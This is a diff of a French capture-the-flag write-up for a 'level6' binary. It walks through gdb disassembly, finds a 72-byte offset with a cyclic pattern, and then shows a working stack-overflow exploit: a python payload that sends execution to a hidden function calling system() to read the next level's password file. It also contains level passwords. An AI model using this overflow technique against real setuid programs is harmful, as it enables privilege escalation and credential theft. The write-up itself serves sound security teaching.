@@ -14,16 +14,17 @@ Password:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 ```
 :~$ ls -la
-dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
+total 17
+dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
 dr-x--x--x  1 root   root    340 Sep 23  2015 ..
--rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
--rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
--rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level6
--rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
--rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
+-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
+-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
+-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
 ```
 
-Le Home contient un binaire `level5` :
+Le Home contient un binaire `level6` :
 
 ```
 :~$ ./level6
@@ -102,7 +103,7 @@ End of assembler dump.
 (gdb) disas n
 Dump of assembler code for function n:
    (...)
-   0x0804845a <+6>:	    movl   $0x80485b0,(%esp)
+   0x0804845a <+6>:  movl   $0x80485b0,(%esp)
    0x08048461 <+13>:	call   0x8048370 <system@plt>
    0x08048466 <+18>:	leave  
    0x08048467 <+19>:	ret    
@@ -113,16 +114,37 @@ On decouvre deux fonctions qui ne sont pas exploitees:
 - `m()`: appel une fonction `puts()`
 - `n()`: appel la fonction `system()`
 
-Si on check la valeur de `$0x80485b0` (+6) dans `n()`
+Si on check la valeur de `$0x80485b0` (+6) dans `n()`, on peux en comprendre comment l'utiliser.
 
 ```
 (gdb) x/s 0x80485b0
 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
 ```
 
+```
+(gdb) run AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz
+Starting program: /home/user/level6/level6 AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz
+
+Program received signal SIGSEGV, Segmentation fault.
+0x67476646 in ?? ()
+(gdb) info register eip
+eip            0x67476646	0x67476646
+(gdb) 
+```
+
+>>>>
+>>>> CALCUL DE L'OFFSET
+>>>>
 
 
+L'offset pour son exploit est donc 72.
 
+On va donc envoyer en argument de notre binaire *72 bytes* + l'adresse la fonction (0x08048454) `n()` afin d'appeler la fonction `system()`
 
+```
+:~$ python -c 'print "a" * 72 + "\x54\x84\x04\x08"' > /tmp/level6
 
+:~$ ./level6 $(cat /tmp/level6)
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
 
